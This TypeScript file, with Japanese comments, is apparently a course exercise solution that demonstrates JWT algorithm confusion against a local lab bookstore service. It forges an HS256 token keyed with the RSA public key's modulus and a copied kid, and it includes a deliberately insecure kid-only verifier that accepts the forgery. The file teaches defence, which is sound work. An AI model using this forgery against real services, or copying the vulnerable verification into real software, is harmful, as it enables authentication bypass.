// 問題 6 の解答: アルゴリズム混同を再現し、「kid を確認しているから安全」が成り立たないことを示します。
// 実行: docker compose exec app npx tsx src/session04/attacker-kid-confusion.ts
import type { JWTPayload } from "jose";
import { decodeJwt, decodeProtectedHeader } from "jose";
import { AUDIENCE, ISSUER, fetchSigningKey } from "./bookstore-endpoints.js";
import { verifyByHeaderAlg } from "./api-service-verify-insecure.js";
import { verifyAccessToken } from "./api-service-verify-jwt.js";
import { forgeHs256Token } from "./attacker-forge-tokens.js";

/** 悪い例 3: kid が合っていることだけを確認し、署名は見ない */
function verifyByKidOnly(token: string, expectedKid: string): JWTPayload {
  const header = decodeProtectedHeader(token);
  if (header.kid !== expectedKid) {
    throw new Error("kid が JWKS の鍵と違います");
  }
  return decodeJwt(token);
}

const signingKey = await fetchSigningKey();
const nowSec = Math.floor(Date.now() / 1000);
const claims = {
  iss: ISSUER,
  sub: "attacker",
  aud: AUDIENCE,
  iat: nowSec,
  exp: nowSec + 300,
  jti: "forged-0002",
};

// 公開鍵の本体を HMAC の共通鍵として使い、kid は本物の値をそのまま書き写す
const forged = await forgeHs256Token(claims, signingKey.modulus, signingKey.kid);
const forgedHeader = decodeProtectedHeader(forged);

console.log("=== アルゴリズム混同の再現 ===");
console.log(`偽造トークンの alg: ${String(forgedHeader.alg)}`);
console.log(`偽造トークンの kid は JWKS の署名鍵と一致: ${forgedHeader.kid === signingKey.kid}`);

const viaHeaderAlg = await verifyByHeaderAlg(forged, signingKey.modulus);
console.log(`[ヘッダの alg に従う検証] 通ってしまった sub: ${String(viaHeaderAlg["sub"])}`);

const viaKidOnly = verifyByKidOnly(forged, signingKey.kid);
console.log(`[kid だけを確認する検証] 通ってしまった sub: ${String(viaKidOnly["sub"])}`);

try {
  await verifyAccessToken(forged);
  console.log("[algorithms を RS256 に固定した検証] 通ってしまった（実装を見直してください）");
} catch {
  console.log("[algorithms を RS256 に固定した検証] 拒否されました");
}

console.log("結論: kid は「どの鍵で検証するか」の手がかりにすぎず、正しさの証明ではありません");
